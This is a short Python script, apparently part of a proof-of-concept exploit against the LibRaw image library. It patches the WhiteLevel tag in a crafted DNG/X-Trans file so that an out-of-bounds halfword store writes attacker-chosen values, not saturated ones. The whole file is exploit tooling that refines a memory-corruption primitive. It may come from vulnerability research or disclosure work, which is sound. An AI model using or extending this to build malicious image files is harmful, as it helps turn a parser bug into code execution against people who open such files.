#!/usr/bin/env python3
"""Steer the OOB halfword value by changing DNG WhiteLevel (tag 0xc61d).

Input: a full-field X-Trans variant made by craft_nonzero_poc.py. With the
public PoC's WhiteLevel=255, LibRaw scales the 12-bit raw field so the chosen
OOB store saturates to 0xffff. Setting WhiteLevel higher keeps the value below
saturation and yields distinct, file-derived halfwords at the same offset.

usage: craft_whitelevel_poc.py SRC DST WHITELEVEL
"""
import struct
import sys

src, dst = sys.argv[1:3]
wl = int(sys.argv[3])
d = bytearray(open(src, "rb").read())
assert d[:2] == b"II"  # little-endian TIFF, as in the pinned PoC
ifd = struct.unpack_from("<I", d, 4)[0]
n = struct.unpack_from("<H", d, ifd)[0]
found = False
for i in range(n):
    e = ifd + 2 + 12 * i
    tag, typ, cnt = struct.unpack_from("<HHI", d, e)
    if tag == 0xC61D:
        assert typ == 4 and cnt == 1
        struct.pack_into("<I", d, e + 8, wl)
        found = True
assert found
open(dst, "wb").write(d)
print(f"wrote {dst} WhiteLevel={wl}")
